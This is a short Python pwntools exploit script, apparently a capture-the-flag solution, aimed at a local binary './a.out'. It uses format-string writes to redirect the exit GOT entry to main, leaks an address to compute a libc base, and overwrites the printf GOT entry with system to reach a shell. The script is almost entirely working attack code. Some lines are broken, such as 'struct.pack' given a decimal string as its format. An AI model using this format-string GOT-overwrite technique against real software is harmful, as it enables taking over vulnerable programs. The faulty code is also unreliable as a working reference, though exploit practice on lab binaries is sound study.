from pwn import*
import struct

exe = ELF('./a.out', checksec=False)
context.binary = exe

p = process(exe.path)
#gdb.attach(p, api=True)
exit_got = 0x404038
print_got = 0x404020
win = 0x0000000000401162
main = 0x0000000000401175
###############
# return main #
###############
payload = b"%12$n%64x%11$n%4405x%10$hn" + b"a"*6 + p64(exit_got) + p64(exit_got+2) + p64(exit_got+4)
p.sendline(payload)
p.recvuntil("@@")


###############
#  get stack  #
###############
payload = "%37$p"
p.sendline(payload)

p.recvuntil(b"0x")
base = int(p.recv(12),16) - 0x2920a

system_libc = 0x000000000004a4e0
system = system_libc + base
print(hex(system))

hight = (system&0xff0000)>>16
low = (system&0xffff)
h= str(hight)
l= str(low)
print (h, l)
a = struct.pack(h, 2)
b = struct.pack(l, 2)
payload = b"%" + a + b"x%12$hhn%" + b + b"x%11$hn"
payload += b"a"*(40-len(payload)) + p64(print_got) + p64(print_got+2)
p.send(payload)
print(payload)

p.interactive()
